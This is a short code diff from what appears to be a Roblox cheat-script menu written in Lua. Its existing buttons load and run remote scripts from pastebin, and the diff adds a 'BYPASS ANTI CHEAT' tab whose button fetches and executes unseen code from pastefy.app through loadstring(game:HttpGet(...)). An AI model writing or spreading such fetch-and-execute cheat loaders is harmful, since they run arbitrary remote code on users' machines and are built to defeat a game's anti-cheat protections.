@@ -239,3 +239,13 @@ loadstring(game:HttpGet("https://pastebin.com/raw/ZdyDttMz"))()
 loadstring(game:HttpGet("https://pastebin.com/raw/ycK5uYHW"))()
     end,
  })
+
+local MainTab = Window:CreateTab("BYPASS ANTI CHEAT", 14577807372) -- Title, Image
+local MainSection = MainTab:CreateSection("Main")
+
+  local Button = MainTab:CreateButton({
+    Name = "Bypass",
+    Callback = function()     
+ loadstring(game:HttpGet("https://pastefy.app/gZjixo1b/raw"))()
+    end,
+ })
